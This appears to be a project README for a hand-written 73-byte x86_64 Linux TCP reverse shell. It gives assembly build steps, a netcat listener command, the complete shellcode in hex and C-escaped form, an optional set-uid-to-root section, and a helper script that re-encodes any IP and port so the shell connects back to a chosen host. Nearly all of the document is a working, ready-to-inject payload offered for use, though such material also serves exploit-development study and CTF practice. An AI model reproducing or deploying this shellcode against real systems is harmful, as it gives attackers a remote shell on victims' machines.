Linux TCP reverse shell for x86_64 architecture.

This is sort of a continuation of the [KiD project](https://github.com/Xre0uS/KiD), instead of generating a shellcode using msfvenon, it's written by me.

Assembling and linking:

```shell
nasm -f elf64 reverse.asm
ld reverse.o -o reverse
```

It works as expected on its own, catch the shell with `nc -lvnp 4444`.

Get the shellcode/opcode with [pwntools](https://github.com/Gallopsled/pwntools):

```python
python3
>>> from pwn import *
>>> file = ELF("reverse")
>>> shellcode = file.section(".text")
>>> print(shellcode.hex())
6a29586a025f6a015e990f0597b02a5248be0200115c7f000001564889e6b2100f056a025eb0210f0540fece79f7b03b6a0048bf2f2f62696e2f7368574889e76a004889e6b2000f05
```

Or print it with `\x` notation for C programs:

```python
>>> print(''.join(f'\\x{byte:02x}' for byte in shellcode))
\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05\x97\xb0\x2a\x52\x48\xbe\x02\x00\x11\x5c\x7f\x00\x00\x01\x56\x48\x89\xe6\xb2\x10\x0f\x05\x6a\x02\x5e\xb0\x21\x0f\x05\x40\xfe\xce\x79\xf7\xb0\x3b\x6a\x00\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7\x6a\x00\x48\x89\xe6\xb2\x00\x0f\x05
```

The shellcode is 73 bytes in size.

There's a section to set uid to root, it's commented out since it won't work if the account executing the shellcode is not root, uncomment if root will be executing.

I've also included a simple script to convert IP and port to hexadecimal in little endian to easily modify the reverse shell.

```bash
./addr2asm.sh 127.0.0.1 4444
0x0100007f5c110002
```

Change the IP and port at line 20.